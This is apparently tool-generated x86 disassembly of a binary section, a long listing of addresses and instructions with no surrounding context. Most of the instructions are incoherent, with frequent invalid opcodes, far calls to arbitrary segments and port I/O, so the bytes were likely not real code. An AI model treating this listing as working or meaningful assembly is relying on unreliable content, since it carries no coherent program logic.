  407a26:	mov    al,0xfb
  407a28:	xlat   BYTE PTR gs:[ebx]
  407a2a:	cmp    dl,BYTE PTR [eax+ebp*2]
  407a2d:	(bad)  
  407a2e:	into   
  407a2f:	call   0xe941:0xa7ff5100
	...
  407a5e:	add    BYTE PTR [edx],al
  407a60:	dec    esi
  407a61:	loope  0x407a84
  407a63:	popa   
  407a64:	adc    edi,esi
  407a66:	xor    al,0x80
  407a68:	sti    
  407a69:	dec    ebp
  407a6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6b:	or     dl,BYTE PTR [eax+ebp*2]
  407a6e:	lock dec ebx
  407a70:	call   0xe941:0xa7ff0100
  407a77:	repnz dec ebp
  407a79:	loope  0x407a7b
  407a7b:	or     eax,0x48feff1e
  407a80:	movntq QWORD PTR [esi],mm6
  407a83:	rol    DWORD PTR [edi+edi*8+0x402b6368],cl
  407a8a:	add    BYTE PTR [ebp+0x78],cl
  407a8d:	push   ebx
  407a8e:	inc    ecx
  407a8f:	inc    ebp
  407a90:	test   BYTE PTR ds:0xff1e7de1,dh
  407a96:	dec    BYTE PTR [eax+0xf]
  407a99:	out    0x1e,eax
  407a9b:	arpl   WORD PTR [ecx+0x2afe68ff],ax
  407aa1:	inc    eax
  407aa2:	add    ch,bl
  407aa4:	jge    0x407af9
  407aa6:	inc    ecx
  407aa7:	cmc    
  407aa8:	xor    DWORD PTR ds:0xff17ade1,0xe71688fe
  407ab2:	push   es
  407ab3:	adc    eax,DWORD PTR [ecx+0x2d0a68ff]
  407ab9:	inc    eax
  407aba:	add    BYTE PTR [ebp-0x3abead35],ch
  407ac0:	add    DWORD PTR ss:[eax],eax
	...
  407aeb:	add    BYTE PTR [ebp-0x428a0122],dh
  407af1:	mov    dh,0xef
  407af3:	std    
  407af4:	ret    0x6880
  407af7:	or     ecx,ebp
  407af9:	sbb    eax,0x2c6467ff
  407afe:	inc    eax
  407aff:	add    BYTE PTR [ebp+0x5d],bl
  407b02:	add    BYTE PTR [eax],al
  407b04:	add    eax,0x6d087580
  407b09:	lahf   
  407b0a:	std    
  407b0b:	call   edx
  407b0d:	das    
  407b0e:	or     eax,0x68573454
  407b13:	mov    ebp,0x67ff1e36
  407b18:	xchg   DWORD PTR [esi+0x0],ebx
  407b1b:	sbb    BYTE PTR [ecx+ebp*8],0xf6
  407b1f:	pop    es
  407b20:	je     0x407ae5
  407b22:	outs   dx,BYTE PTR ds:[esi]
  407b23:	call   FWORD PTR [ebx+0x6c]
  407b26:	or     DWORD PTR [ebp+ebx*8+0x3],edx
  407b2a:	fstp   TBYTE PTR [edi+ebp*8+0x1e680442]
  407b31:	add    al,0x3
  407b33:	cmp    BYTE PTR [ebx],0x2f
  407b36:	sti    
  407b37:	out    0x86,eax
  407b39:	scas   eax,DWORD PTR es:[edi]
  407b3a:	ins    DWORD PTR es:[edi],dx
  407b3b:	push   DWORD PTR [eax+esi*4+0x1c1c40d1]
  407b42:	pusha  
  407b43:	push   ebx
  407b44:	pop    ebp
  407b45:	add    al,0xdb
  407b47:	add    DWORD PTR [esp+eax*1],ebx
  407b4a:	cmp    edi,0xffffff91
  407b4d:	cld    
  407b4e:	pop    edx
  407b4f:	xchg   ebx,eax
	...
  407b78:	add    BYTE PTR [ecx],al
  407b7a:	inc    ecx
  407b7b:	ins    DWORD PTR es:[edi],dx
  407b7c:	push   0xffc1d025
  407b81:	jnp    0x407be8
  407b83:	rol    DWORD PTR [eax+0x1c],1
  407b86:	fadd   QWORD PTR [eax]
  407b88:	add    BYTE PTR [esp+eax*4],bl
  407b8b:	ins    DWORD PTR es:[edi],dx
  407b8c:	jne    0x407bb2
  407b8e:	ins    BYTE PTR es:[edi],dx
  407b8f:	lock cld 
  407b91:	rcl    DWORD PTR [eax],cl
  407b93:	fisttp DWORD PTR ds:0x6802c370
  407b99:	mov    edi,0x43ffc1f4
  407b9e:	push   es
  407b9f:	add    eax,DWORD PTR [eax]
  407ba1:	pushf  
  407ba2:	xor    dh,dh
  407ba4:	pop    es
  407ba5:	mov    ah,0x9e
  407ba7:	outs   dx,DWORD PTR ds:[esi]
  407ba8:	jmp    DWORD PTR [ebx-0x22abf665]
  407bae:	add    ebx,ebx
  407bb0:	loop   0x407ba1
  407bb2:	inc    edx
  407bb3:	add    al,0x68
  407bb5:	push   ds
  407bb6:	add    al,0x3
  407bb8:	add    BYTE PTR [ebx-0x151803ba],0x5a
  407bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc0:	ins    BYTE PTR es:[edi],dx
  407bc1:	jae    0x407b47
  407bc3:	add    ebp,DWORD PTR [ebp-0xf]
  407bc6:	bound  eax,QWORD PTR [ecx-0x71ee9e06]
  407bcc:	fsin   
  407bce:	adc    esp,edi
  407bd0:	sti    
  407bd1:	cmp    edx,DWORD PTR [ecx]
  407bd3:	jl     0x407c41
  407bd5:	dec    ebx
  407bd6:	test   ch,dl
  407bd8:	ins    BYTE PTR es:[edi],dx
  407bd9:	leave  
  407bda:	bound  eax,QWORD PTR [ecx+0x76]
	...
  407c04:	add    BYTE PTR [eax],al
  407c06:	cmp    DWORD PTR [ecx],edx
  407c08:	data16 ins BYTE PTR es:[edi],dx
  407c0a:	test   eax,0x23f65e0e
  407c0f:	add    edx,DWORD PTR [ebx]
  407c11:	inc    esp
  407c12:	and    edx,DWORD PTR [ecx]
  407c14:	and    BYTE PTR [ecx+0x20],al
  407c17:	pop    ebx
  407c18:	pushf  
  407c19:	js     0x407c1b
  407c1b:	fnstsw WORD PTR [ebx-0x3572f401]
  407c21:	(bad)  [edi-0x59]
  407c24:	test   al,0x3
  407c26:	sti    
  407c27:	xchg   ch,dh
  407c29:	pop    ebx
  407c2a:	pop    ebp
  407c2b:	sbb    DWORD PTR [esi],ebx
  407c2d:	ins    BYTE PTR es:[edi],dx
  407c2e:	dec    esp
  407c2f:	sub    ecx,0x3
  407c32:	repz sar DWORD PTR [eax+0x1163516c],1
  407c39:	mov    ds:0x5afe10c4,eax
  407c3e:	call   0x958e:0x346bf61d
  407c45:	ret    0x11bb
  407c48:	pop    esp
  407c49:	clc    
  407c4a:	mov    ebx,0xab6ba73b
  407c4f:	stos   DWORD PTR es:[edi],eax
  407c50:	inc    ecx
  407c51:	add    eax,0xd48f001c
  407c56:	call   0xbe03:0x135bf186
  407c5d:	imul   esi,DWORD PTR [esi+edi*2+0x0],0xffffffab
  407c62:	test   DWORD PTR [edi],0x9b4c5968
  407c68:	add    BYTE PTR [esi+0x0],ah
	...
  407c92:	add    BYTE PTR [ebp+0x64],ch
  407c95:	call   0xff505a38
  407c9a:	cmp    DWORD PTR [eax+0x5a],eax
  407c9d:	add    BYTE PTR [esi-0x7a],bh
  407ca0:	stos   DWORD PTR es:[edi],eax
  407ca1:	(bad)  
  407ca2:	cld    
  407ca3:	push   edi
  407ca4:	clc    
  407ca5:	pop    ebp
  407ca6:	xchg   ecx,eax
  407ca7:	mov    bh,0xf
  407ca9:	call   0xff5056d3
  407cae:	mov    al,ds:0xbc0062e2
  407cb3:	mov    dl,0xfe
  407cb5:	(bad)  
  407cb6:	aam    0x33
  407cb8:	clc    
  407cb9:	xchg   esp,eax
  407cba:	das    
  407cbb:	mov    bh,0xf
  407cbd:	or     ebp,DWORD PTR [ecx]
  407cbf:	or     al,0x72
  407cc1:	push   0x9ae3c8
  407cc6:	cdq    
  407cc7:	addr16 cmp al,dh
  407cca:	ss ja  0x407c78
  407ccd:	push   eax
  407cce:	cs in  eax,dx
  407cd0:	push   edi
  407cd1:	call   0xff51036b
  407cd6:	adc    DWORD PTR [edi],edx
  407cd8:	sbb    eax,0x1d2116ff
  407cdd:	or     cl,ch
  407cdf:	in     al,dx
  407ce0:	in     al,0xeb
  407ce2:	push   0x5c
  407ce4:	sti    
  407ce5:	imul   ebp,ecx,0xf6108636
  407ceb:	int3   
  407cec:	arpl   di,di
  407cee:	mov    ah,0x40
  407cf0:	mov    ds:0x7557e941,eax
  407cf5:	(bad)
	...
  407d20:	ss loop 0x407d67
  407d23:	ffree  st(1)
  407d25:	paddd  mm2,QWORD PTR [esp+ebp*1+0x10]
  407d2a:	jne    0x407d2c
  407d2c:	mov    DWORD PTR [ebp+esi*1-0xe9b21f],eax
  407d33:	out    0x71,eax
  407d35:	call   0x6afb:0x1afcffff
  407d3c:	test   DWORD PTR [ebp+esi*2+0xb0a8a18],eax
  407d43:	inc    DWORD PTR [eax+0x76]
  407d46:	dec    eax
  407d47:	inc    ecx
  407d48:	inc    ebp
  407d49:	mov    bl,0xee
  407d4b:	les    ebx,FWORD PTR [edx-0x62ba767c]
  407d51:	xchg   edx,eax
  407d52:	inc    ebp
  407d53:	call   0x1cb6017d
  407d58:	retf   0xb0a
  407d5b:	call   DWORD PTR [eax]
  407d5d:	jbe    0x407da7
  407d5f:	inc    ecx
  407d60:	xor    eax,0xcac4d6b3
  407d65:	test   BYTE PTR [ecx-0xcf8abb],cl
  407d6b:	(bad)  
  407d6c:	sar    BYTE PTR [edx],1
  407d6e:	push   DWORD PTR [ebp-0x7]
  407d71:	xor    DWORD PTR ds:0xff17bde1,0xff4e45e7
  407d7b:	jmp    FWORD PTR [ebx+ebx*1-0x15]
  407d7f:	(bad)  
  407d80:	sar    BYTE PTR [edx+0x50],0xff
	...
  407dac:	add    BYTE PTR [eax-0x68a0092],al
  407db2:	xor    DWORD PTR ds:0xff178de1,0xff4e6de7
  407dbc:	(bad)  
  407dbd:	cmp    al,0x1b
  407dbf:	jecxz  0x407d44
  407dc1:	dec    eax
  407dc2:	jbe    0x407dc4
  407dc4:	cmovno ebp,ebx
  407dc7:	(bad)  
  407dc8:	push   DWORD PTR [ebp+0x1cf87cd7]
  407dce:	add    al,0xf8
  407dd0:	and    DWORD PTR [esi-0x60fffcfc],0xffffff97
  407dd7:	jo     0x407dd9
  407dd9:	sbb    edi,DWORD PTR [eax-0x7c]
  407ddc:	add    BYTE PTR [esp+eax*1],bl
  407ddf:	push   0xeebd4475
  407de4:	pop    es
  407de5:	test   BYTE PTR [edi],cl
  407de7:	test   eax,0xeeed6bff
  407dec:	sti    
  407ded:	arpl   WORD PTR [edi-0x4],bp
  407df0:	out    0xc8,eax
  407df2:	popf   
  407df3:	imul   edi,edi,0xff6b0f53
  407df9:	ror    DWORD PTR [ebx],1
  407dfb:	pop    ebx
  407dfc:	popa   
  407dfd:	add    BYTE PTR [ebp-0x784e0097],0x69
  407e04:	jne    0x407e2a
  407e06:	lods   al,BYTE PTR ds:[esi]
  407e07:	sar    BYTE PTR [ebp+0x7d83ad2b],cl
  407e0d:	hlt    
  407e0e:	adc    BYTE PTR [ebx],al
  407e10:	out    dx,eax
	...
  407e39:	add    dl,bl
  407e3b:	es idiv dh
  407e3e:	mov    DWORD PTR [ecx+ebp*2+0x75],edx
  407e42:	adc    al,0xac
  407e44:	(bad)  
  407e45:	mov    ebp,0xe5d4503
  407e4a:	sti    
  407e4b:	(bad)  
  407e4c:	pop    edx
  407e4d:	jmp    FWORD PTR [ecx+0x74]
  407e50:	imul   esi,DWORD PTR [ebp+0x14],0xe3be026c
  407e57:	imul   esi,DWORD PTR fs:[ebp-0x38],0xc407ef5c
  407e5f:	sbb    al,0xa9
  407e61:	dec    ebx
  407e63:	and    bh,0xe3
  407e66:	sbb    al,0x90
  407e68:	push   cs
  407e69:	cmp    DWORD PTR [ecx],0x64
  407e6c:	add    BYTE PTR [ebp+0x23],dh
  407e6f:	pop    ebx
  407e70:	jb     0x407e30
  407e72:	mov    edi,0x2969190d
  407e77:	arpl   cx,ax
  407e79:	xchg   edi,eax
  407e7a:	(bad)  ds:0x81265cce
  407e80:	jmp    0xd1a38fed
  407e85:	mov    ds:0x68b60dc1,eax
  407e8a:	icebp  
  407e8b:	push   es
  407e8c:	shl    DWORD PTR [eax+0x5c],0xd
  407e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e91:	push   0x48910ef1
  407e96:	pop    esp
  407e97:	or     eax,0x12d16896
  407e9c:	adc    DWORD PTR [eax+0x0],0x0
	...
  407ec7:	pop    esp
  407ec8:	or     eax,0xad16886
  407ecd:	xchg   ecx,eax
  407ece:	cmp    BYTE PTR [ebp+ecx*1+0x76],bl
  407ed2:	push   0x4080feb1
  407ed7:	pop    esp
  407ed8:	or     eax,0xf6b16866
  407edd:	push   eax
  407ede:	test   al,0x5c
  407ee0:	or     eax,0x37de3a56
  407ee5:	jmp    0x684025b8
  407eea:	aas    
  407eeb:	or     al,0x5
  407eed:	ds push 0x58e96874
  407ef3:	mov    edx,0x5ccf3683
  407ef8:	pop    ebx
  407ef9:	xchg   ecx,eax
  407efa:	push   edi
  407efb:	push   eax
  407efc:	call   0x3a8:0xa7fadbe9
  407f03:	inc    esp
  407f04:	cs mov ch,0xc2
  407f07:	shl    DWORD PTR [ecx+eiz*1-0x31],cl
  407f0b:	pop    esp
  407f0c:	pop    ebx
  407f0d:	xchg   ecx,eax
  407f0e:	gs push 0x44e9009a
  407f14:	xchg   BYTE PTR [esi+ebp*8],cl
  407f17:	rcl    DWORD PTR [eax+ebp*8+0x50],0x42
  407f1c:	or     al,0xff
  407f1e:	push   ecx
  407f1f:	cvtdq2ps xmm5,xmm7
  407f22:	xchg   edi,eax
  407f23:	js     0x407f69
  407f25:	push   ebp
  407f26:	sub    BYTE PTR [eax],bl
  407f28:	xor    DWORD PTR [ebx],0x1c
	...
  407f53:	add    BYTE PTR [ecx+0xc],ah
  407f56:	addr16 push es
  407f58:	ins    DWORD PTR es:[edi],dx
  407f59:	fwait
  407f5a:	add    BYTE PTR [ecx+0x73],al
  407f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f5e:	inc    ecx
  407f5f:	jmp    0x2895d8bb
  407f64:	and    BYTE PTR [ebx+0xc59341b],al
  407f6a:	(bad)  
  407f6b:	sbb    al,0x54
  407f6d:	or     eax,0x4ff7e175
  407f72:	inc    BYTE PTR [esi-0x16eb7d3d]
  407f78:	jmp    0x9b:0x4d5167cc
  407f7f:	add    DWORD PTR [ebx+0x47e941a5],esi
  407f85:	xchg   BYTE PTR [ebp-0x58],dl
  407f88:	pop    ds
  407f89:	adc    DWORD PTR [esp+edi*4-0x20],0xb
  407f8e:	stos   BYTE PTR es:[di],al
  407f90:	in     al,dx
  407f91:	call   0xe941:0xa6fcd100
  407f98:	jp     0x407f20
  407f9a:	or     al,0x36
  407f9c:	in     eax,dx
  407f9d:	push   ebx
  407f9e:	call   0xff4cf97f
  407fa3:	je     0x407f82
  407fa5:	(bad)  
  407fa7:	push   ds
  407fa8:	in     eax,dx
  407fa9:	pop    edi
  407faa:	(bad)  
  407fab:	fadd   QWORD PTR [eax-0x5d]
  407fae:	inc    ecx
  407faf:	jmp    0xed232b
  407fb4:	mov    ch,0x57
  407fb6:	or     eax,eax
	...
  407fe0:	add    BYTE PTR [eax+0x2],cl
  407fe3:	mov    BYTE PTR [ebp-0x53],0x57
  407fe7:	add    BYTE PTR [eax],al
  407fe9:	lds    ecx,FWORD PTR [ebp+eax*2-0xc]
  407fed:	ret    0xff0c
  407ff0:	dec    DWORD PTR [edi+0x57]
  407ff3:	push   0x0
  407ff5:	fist   WORD PTR [esi+0x6a]
  407ff8:	add    al,dh
  407ffa:	sbb    dh,bl
  407ffc:	push   eax
  407ffd:	adc    bl,bl
  407fff:	repz test edx,0x38ff5074
  408006:	jg     0x408007
  408008:	jne    0x407fcb
  40800a:	scas   eax,DWORD PTR es:[edi]
  40800b:	push   ds
  40800c:	lods   al,BYTE PTR ds:[esi]
  40800d:	jne    0x408066
  40800f:	or     eax,eax
  408011:	or     DWORD PTR [ecx-0x15],ebx
  408014:	inc    eax
  408015:	sbb    eax,0x454147c2
  40801a:	je     0x408091
  40801c:	or     al,0xad
  40801e:	or     edx,eax
  408020:	inc    edx
  408022:	nop
  408023:	ror    BYTE PTR [ebp-0x88438],1
  408029:	ret    0x5127
  40802c:	call   0x4018bb
  408031:	lods   al,BYTE PTR ds:[esi]
  408032:	(bad)  
  408034:	div    DWORD PTR [edx-0x7f]
  408037:	push   DWORD PTR [ebp-0x868b]
  40803d:	bound  ecx,QWORD PTR [ebx]
  40803f:	pop    es
  408040:	call   0x40008d
	...
  40806d:	add    BYTE PTR [edx],dh
  40806f:	retf   
  408070:	out    dx,eax
  408071:	test   DWORD PTR [edx-0x7f],0x8182a5e8
  408078:	(bad)  
  408079:	(bad)  
  40807a:	mov    eax,0x1c95eb76
  40807f:	jno    0x408071
  408081:	sti    
  408082:	les    eax,FWORD PTR [eax-0x66]
  408085:	add    BYTE PTR [ebx+ecx*2],bl
  408088:	inc    ecx
  408089:	or     BYTE PTR [edi+ebp*8],bl
  40808c:	jns    0x40807a
  40808e:	lahf   
  40808f:	cmp    BYTE PTR [edi+0x6a],ah
  408092:	sbb    al,0xde
  408094:	cld    
  408095:	(bad)  
  408096:	xor    DWORD PTR [ebx+ebx*2],ecx
  408099:	mov    edx,0x89652960
  40809e:	loope  0x4080cf
  4080a0:	fcomp  QWORD PTR [esi-0xfbcd18]
  4080a6:	adc    DWORD PTR [ebx+ebx*2],ecx
  4080a9:	mov    bh,0x82
  4080ab:	leave  
  4080ac:	fs push 0x1c
  4080af:	pushf  
  4080b0:	cmp    BYTE PTR [ebp+ebx*8-0xd],dl
  4080b4:	ficomp DWORD PTR [esi-0xfbcd30]
  4080ba:	sub    ebx,edx
  4080bc:	mov    ebx,0xf0dc1c40
  4080c1:	rcl    DWORD PTR [ebx-0x27],0xf8
  4080c5:	mov    edi,0x4fd310d0
  4080ca:	inc    ebx
  4080cb:	psubq  mm4,mm7
  4080ce:	xchg   ecx,eax
  4080cf:	nop
  4080d0:	inc    DWORD PTR gs:[eax]
	...
  4080fb:	inc    esp
  4080fc:	cmp    al,0xa5
  4080fe:	jmp    FWORD PTR [ebx]
  408100:	add    ebp,DWORD PTR cs:[eax+0x63]
  408104:	int3   
  408105:	sar    edi,0x83
  408108:	out    0xcf,al
  40810a:	inc    eax
  40810b:	sbb    al,0x99
  40810d:	das    
  40810e:	loope  0x408164
  408110:	mov    bl,0x2
  408112:	call   0xffa5b76c
  408117:	daa    
  408118:	xor    al,0xf0
  40811a:	push   cs
  40811b:	dec    esp
  40811c:	in     al,0x63
  40811e:	jne    0x408134
  408120:	pop    ebx
  408121:	adc    ecx,ebx
  408123:	out    0x9,eax
  408125:	push   ds
  408126:	pop    esp
  408127:	cmp    cl,dl
  408129:	adc    eax,0x815b4665
  40812e:	aaa    
  40812f:	jo     0x4080cd
  408131:	jmp    0xa8ef2411
  408136:	add    eax,DWORD PTR [ebp+ebx*2-0x17]
  40813a:	add    ebx,DWORD PTR [edx+esi*8+0x9ab41c8]
  408141:	repnz inc ebx
  408143:	sub    BYTE PTR [edx+0x39],bl
  408146:	aam    0x9a
  408148:	(bad)  
  408149:	loope  0x4081a6
  40814b:	fiadd  WORD PTR [esi]
  40814d:	into   
  40814e:	fs je  0x408160
  408151:	xchg   DWORD PTR [ebx+eax*4+0x74],esp
  408155:	jmp    0x28d33c35
  40815a:	add    al,0x4
  40815c:	int    0x14
  40815e:	ret    
	...
  408187:	add    BYTE PTR [ebx-0x7f],ch
  40818a:	jmp    0x40818f
  40818c:	sbb    al,0xdb
  40818e:	nop
  40818f:	ins    BYTE PTR es:[edi],dx
  408190:	pop    ebp
  408191:	or     DWORD PTR [esi-0x21716c08],edx
  408197:	rcr    ebx,cl
  408199:	or     esp,edi
  40819b:	sti    
  40819c:	cmp    esp,DWORD PTR [ebx+0x7d]
  40819f:	fs cmp esi,edx
  4081a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a4:	xor    ecx,DWORD PTR [ecx]
  4081a6:	add    ecx,DWORD PTR [edx]
  4081a8:	sub    ecx,DWORD PTR [edi+0x6a65bf1]
  4081ae:	pop    esi
  4081af:	xchg   BYTE PTR fs:[esi+edx*2],bh
  4081b3:	out    dx,al
  4081b4:	sbb    esi,ebx
  4081b6:	fsub   DWORD PTR [edi+0xb]
  4081b9:	or     ebx,edx
  4081bb:	pop    es
  4081bc:	add    ecx,DWORD PTR [edi+0x7825bf1]
  4081c2:	add    BYTE PTR [esi],dh
  4081c4:	js     0x4081ce
  4081c6:	jne    0x4081f5
  4081c8:	or     BYTE PTR [esi-0x38c1eef8],0xfe
  4081cf:	push   ds
  4081d0:	push   ss
  4081d1:	sbb    eax,0xd5e2e904
  4081d6:	jmp    0x408242
  4081d8:	or     eax,DWORD PTR [edi]
  4081da:	push   esi
  4081db:	sahf   
  4081dc:	in     eax,0x8
  4081de:	imul   esp,esi,0x1088e40
  4081e4:	pop    esp
  4081e5:	(bad)  
  4081e6:	(bad)  
  4081e7:	out    dx,al
  4081e8:	and    eax,0x72fc9e
	...
  408215:	add    eax,0x2028487e
  40821a:	aam    0x3c
  40821c:	inc    eax
  40821d:	pusha  
  40821e:	fwait
  40821f:	add    BYTE PTR [ecx+0x3f],ch
  408222:	pop    ebx
  408223:	je     0x40825f
  408225:	jo     0x4081da
  408227:	push   esp
  408228:	sub    BYTE PTR [eax],ah
  40822a:	mov    al,0xe8
  40822c:	leave  
  40822d:	ret    0x5b
  408230:	loop   0x408211
  408232:	mov    ds,WORD PTR [edi]
  408234:	aas    
  408235:	lock dec esi
  408237:	enter  0xbf9e,0xaa
  40823b:	push   0xbdf81fe9
  408240:	add    ebp,edx
  408242:	lods   eax,DWORD PTR ds:[esi]
  408243:	inc    ecx
  408244:	jmp    0xf1b58bd8
  408249:	(bad)  
  40824a:	call   0x2f48:0xf2bf76e7
  408251:	mov    edi,0x659e6807
  408256:	fwait
  408257:	add    BYTE PTR [esi-0x16563279],dh
  40825d:	pop    ds
  40825e:	push   esp
  40825f:	rcl    ch,0x1e
  408262:	mov    cl,0xe8
  408264:	add    bl,dh
  408266:	xchg   ebx,eax
  408267:	(bad)  
  408268:	call   DWORD PTR [ebp+0x5afffef3]
  40826e:	mov    ebp,0x1e90c567
  408273:	dec    DWORD PTR [edi+0x3a]
  408276:	and    al,BYTE PTR [edi]
  408278:	call   0x40827d
	...
  4082a1:	add    bh,dl
  4082a3:	je     0x4082a4
  4082a5:	call   FWORD PTR ds:0x1affbd08
  4082ab:	js     0x4082ae
  4082ad:	inc    esi
  4082ae:	xor    eax,0x1f75003d
  4082b3:	adc    eax,0xe60533fb
  4082b8:	(bad)  
  4082b9:	(bad)  
  4082ba:	mov    edx,0xfdaef27c
  4082bf:	push   ebx
  4082c0:	jne    0x40824f
  4082c2:	jp     0x4082e6
  4082c4:	sti    
  4082c5:	push   eax
  4082c7:	push   esi
  4082c8:	call   0xffbd3144
  4082cd:	pop    edi
  4082ce:	cmp    edx,DWORD PTR [esi-0x3d7afb3e]
  4082d4:	mov    esp,ebp
  4082d6:	fstp   QWORD PTR [esi+0x0]
  4082d9:	out    dx,eax
  4082da:	sti    
  4082db:	repz in eax,0x55
  4082de:	xor    al,0x5f
  4082e0:	push   DWORD PTR [ebp+0x49]
  4082e3:	jl     0x40835a
  4082e5:	or     BYTE PTR [ebp-0x65001956],bl
  4082eb:	repz (bad) 
  4082ed:	jmp    FWORD PTR [edx+0x10ec67b9]
  4082f3:	push   ds
  4082f4:	(bad)  
  4082f5:	(bad)  
  4082f6:	xor    BYTE PTR [edi-0x1],dl
  4082f9:	jne    0x408338
  4082fb:	jae    0x4082b5
  4082fd:	out    0xba,al
  4082ff:	jl     0x4082ca
  408301:	ret    0x5b0d
  408304:	push   ebp
  408305:	mov    eax,DWORD PTR [eax]
	...
  40832f:	sbb    al,0xa0
  408331:	bound  esi,QWORD PTR [ebp+0x18]
  408334:	pushf  
  408335:	adc    al,dl
  408337:	add    ebx,DWORD PTR [esi-0x58f3ff2]
  40833d:	jmp    0xf450:0x2b349d0
  408344:	test   eax,0xc4e3ff44
  408349:	mov    dl,0xfe
  40834b:	push   ecx
  40834c:	or     al,0x6b
  40834e:	stos   DWORD PTR es:[edi],eax
  40834f:	shr    DWORD PTR [ebp+0x62],cl
  408352:	call   0xffa31afc
  408357:	aad    0x32
  408359:	or     eax,DWORD PTR [eax]
  40835b:	push   ecx
  40835c:	mov    DWORD PTR [edi-0x7d],ebp
  40835f:	fcom   DWORD PTR [eax]
  408361:	in     al,dx
  408362:	push   DWORD PTR ds:0x147561fc
  408368:	sub    al,0x9d
  40836a:	mov    edx,0x458b259b
  40836f:	nop
  408370:	call   0xffc3:0x4e606804
  408377:	sti    
  408378:	ret    0x40b6
  40837b:	sbb    al,0xc5
  40837d:	push   ss
  40837e:	loope  0x408364
  408380:	xor    al,BYTE PTR [eax+ebp*8]
  408383:	popf   
  408384:	mov    ah,0x60
  408386:	call   DWORD PTR [edi]
  408388:	mov    ah,0xd7
  40838a:	adc    ebp,esp
  40838c:	imul   eax,DWORD PTR [ebx],0x0
  40838f:	inc    ebx
  408390:	scas   al,BYTE PTR es:[edi]
  408391:	mov    ah,0xfe
	...
  4083bb:	add    cl,dl
  4083bd:	sti    
  4083be:	push   0x63
  4083c0:	aas    
  4083c1:	frstor [eax-0x18]
  4083c4:	int    0x46
  4083c6:	popa   
  4083c7:	inc    esi
  4083c9:	repz jmp 0xa68:0x432d2c3
  4083d1:	pop    ebx
  4083d2:	mov    edi,0x14051bc2
  4083d7:	arpl   WORD PTR [esp+ebx*4-0x17],sp
  4083db:	imul   ebp,DWORD PTR [esi+0x1b],0x4e
  4083df:	popa   
  4083e0:	pop    ss
  4083e1:	sbb    edi,DWORD PTR [ebp-0x178c9409]
  4083e7:	add    eax,DWORD PTR [ebx]
  4083e9:	lds    ebx,FWORD PTR [eax+0x41537160]
  4083ef:	sbb    bh,bh
  4083f1:	add    eax,0xc7fe6c26
  4083f6:	sbb    eax,0x815b4661
  4083fb:	aaa    
  4083fc:	jb     0x40839a
  4083fe:	jmp    0xa8edd7ee
  408403:	add    edi,DWORD PTR [ebx+0x5ccc084f]
  408409:	pop    ebx
  40840a:	add    DWORD PTR ds:0xcee05dc,esp
  408410:	fmul   QWORD PTR [esi+0x5ebb3f6]
  408416:	push   esp
  408417:	or     al,0x84
  408419:	push   eax
  40841a:	(bad)  
  40841b:	pusha  
  40841c:	mov    esi,edx
  40841e:	rcr    BYTE PTR [edi+0x0],1
	...
  408448:	add    BYTE PTR [ebx+0x4045305],al
  40844e:	das    
  40844f:	pop    ss
  408450:	ret    
  408451:	jae    0x4084d0
  408453:	xor    DWORD PTR [edx+0x16ae5adc],edi
  408459:	jge    0x4083ed
  40845b:	sub    BYTE PTR [esp+eax*2],al
  40845e:	add    ebx,DWORD PTR [esi+0x60]
  408461:	push   ebx
  408462:	push   ecx
  408463:	test   eax,0x39ab1ad7
  408468:	popa   
  408469:	leave  
  40846a:	push   edx
  40846b:	xchg   ecx,eax
  40846c:	arpl   WORD PTR [edx],di
  40846e:	add    eax,0xc6626b7e
  408473:	push   DWORD PTR [ebp-0x44]
  408476:	jo     0x408478
  408478:	add    ebx,esp
  40847a:	lods   al,BYTE PTR ds:[esi]
  40847b:	inc    ecx
  40847c:	jmp    0xa8965488
  408481:	pop    ds
  408482:	add    al,0x35
  408484:	dec    eax
  408485:	xlat   BYTE PTR ds:[ebx]
  408486:	fwait
  408487:	add    BYTE PTR [ecx+0x6c],al
  40848a:	(bad)  
  40848b:	inc    BYTE PTR [esi+0x28]
  40848e:	sbb    esi,DWORD PTR [esi+ebp*8-0x51]
  408492:	xchg   esp,eax
  408493:	(bad)  
  408494:	mov    esp,0x2fb5f317
  408499:	jl     0x40849f
  40849b:	call   0xff453fed
  4084a0:	xchg   ebx,eax
  4084a1:	rol    DWORD PTR ds:0x2337e175,cl
  4084a7:	dec    BYTE PTR [esi]
  4084a9:	cmp    al,0x71
  4084ab:	sbb    al,BYTE PTR [esi]
	...
  4084d5:	add    dl,dl
  4084d7:	pop    esp
  4084d8:	call   0xff44c20c
  4084dd:	add    DWORD PTR [eax],0x4
  4084e0:	jne    0x4084c3
  4084e2:	aaa    
  4084e3:	pop    ds
  4084e4:	(bad)  
  4084e5:	out    0xfb,al
  4084e7:	add    esi,DWORD PTR [ebp-0x23]
  4084ea:	repz lea ecx,[eax]
  4084ed:	shr    ecx,0xc1
  4084f0:	dec    dh
  4084f2:	rcr    DWORD PTR [eax],1
  4084f4:	add    al,0xe9
  4084f6:	mov    ah,0xd1
  4084f8:	jmp    0x4084b8
  4084fa:	push   ebp
  4084fb:	push   eax
  4084fc:	call   0xff4465ae
  408501:	loop   0x4084e2
  408503:	mov    cs,WORD PTR [esi+0x11]
  408506:	retf   0x41ac
  408509:	jmp    0xa990819d
  40850e:	jmp    0x408513
  408510:	push   eax
  408511:	cmp    DWORD PTR [eax+0x4500007c],ecx
  408517:	jne    0x4084d7
  408519:	push   0x3fcd8c
  40851e:	add    eax,0x9d0875a4
  408523:	in     ax,0xff
  408526:	add    bh,0x66
  408529:	add    DWORD PTR ds:0x6d68be75,eax
  40852f:	int    0x3f
  408531:	add    ch,al
  408533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408534:	jne    0x40853e
  408536:	dec    ebp
  408537:	xor    ah,ch
  408539:	inc    DWORD PTR [eax]
	...
  408563:	xor    al,bh
  408565:	data16 add dh,ch
  408568:	je     0x408528
  40856a:	push   0x3fccfb
  40856f:	xchg   ebp,eax
  408570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408571:	jne    0x40857b
  408573:	sub    eax,0x32ffe40e
  408578:	ja     0x408594
  40857a:	mov    esp,0xc2c9a412
  40857f:	lods   eax,DWORD PTR ds:[esi]
  408580:	push   edi
  408581:	push   ebp
  408582:	mov    esp,DWORD PTR [ecx]
  408584:	fadd   st,st(3)
